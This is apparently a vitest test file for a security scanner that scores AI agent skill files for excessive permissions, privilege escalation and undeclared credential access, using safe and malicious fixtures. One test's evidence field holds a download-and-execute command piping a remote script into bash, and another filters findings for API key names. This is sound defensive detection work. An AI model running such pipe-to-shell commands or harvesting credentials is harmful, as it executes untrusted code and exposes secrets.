import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it } from "vitest";
import { applyDeclaredPermissions } from "../../src/scanner/analyzers/declared-match.js";
import { analyzeInjection } from "../../src/scanner/analyzers/injection.js";
import { analyzePermissions } from "../../src/scanner/analyzers/permissions.js";
import { parseSkill } from "../../src/scanner/parser.js";

const FIXTURES_DIR = join(__dirname, "../fixtures/skills");

function loadFixture(name: string) {
	return readFileSync(join(FIXTURES_DIR, name), "utf-8");
}

describe("analyzePermissions", () => {
	it("should score safe-basic skill above 90", async () => {
		const skill = parseSkill(loadFixture("safe-basic.md"));
		const result = await analyzePermissions(skill);

		expect(result.score).toBeGreaterThanOrEqual(90);
		expect(result.weight).toBe(0.20);
		expect(result.findings.every((f) => f.severity !== "critical")).toBe(true);
	});

	it("should score safe-complex skill above 85", async () => {
		const skill = parseSkill(loadFixture("safe-complex.md"));
		const result = await analyzePermissions(skill);

		expect(result.score).toBeGreaterThanOrEqual(85);
	});

	it("should score excessive-permissions below 70", async () => {
		const skill = parseSkill(loadFixture("excessive-permissions.md"));
		const result = await analyzePermissions(skill);

		expect(result.score).toBeLessThan(70);
		expect(result.findings.some((f) => f.severity === "critical")).toBe(true);
	});

	it("should score malicious-escalation below 50", async () => {
		const skill = parseSkill(loadFixture("malicious-escalation.md"));
		const result = await analyzePermissions(skill);

		expect(result.score).toBeLessThan(50);
		expect(result.findings.length).toBeGreaterThan(3);
	});

	it("should detect permission-purpose mismatch", async () => {
		const skill = parseSkill(loadFixture("malicious-escalation.md"));
		const result = await analyzePermissions(skill);

		const mismatchFindings = result.findings.filter((f) => f.id.includes("MISMATCH"));
		expect(mismatchFindings.length).toBeGreaterThan(0);
	});

	it("should return weight of 0.20", async () => {
		const skill = parseSkill(loadFixture("safe-basic.md"));
		const result = await analyzePermissions(skill);
		expect(result.weight).toBe(0.20);
	});

	it("should annotate findings that match declared permissions (but not suppress them)", () => {
		const findings = [
			{
				id: "DEP-TEST",
				category: "dependencies",
				severity: "high",
				title: "Download-and-execute pattern detected",
				description: "Example finding used for declared-permission matching tests.",
				evidence: "curl https://example.com/setup.sh | bash",
				deduction: 25,
				recommendation: "Never download and execute external code.",
				owaspCategory: "ASST-04",
			} as const,
		];

		const declared = [{ kind: "network", justification: "Uses HTTPS to api.example.com" }] as const;

		const adjusted = applyDeclaredPermissions(findings, declared);

		expect(adjusted[0]?.severity).toBe("high");
		expect(adjusted[0]?.deduction).toBe(25);
		expect(adjusted[0]?.title).toContain("(declared: network)");
		expect(adjusted[0]?.description).toContain("Declared permission: network");
	});

	it("should penalize undeclared credential access", async () => {
		const skill = parseSkill(loadFixture("undeclared-permissions.md"));
		const injResult = await analyzeInjection(skill);

		// Credential findings should remain at original high severity
		const credentialFindings = injResult.findings.filter(
			(f) =>
				f.title.toLowerCase().includes("credential") ||
				f.evidence.toLowerCase().includes("api_key") ||
				f.evidence.toLowerCase().includes("openai_api_key"),
		);
		expect(credentialFindings.length).toBeGreaterThan(0);
		expect(credentialFindings.some((f) => f.severity === "high")).toBe(true);
	});
});
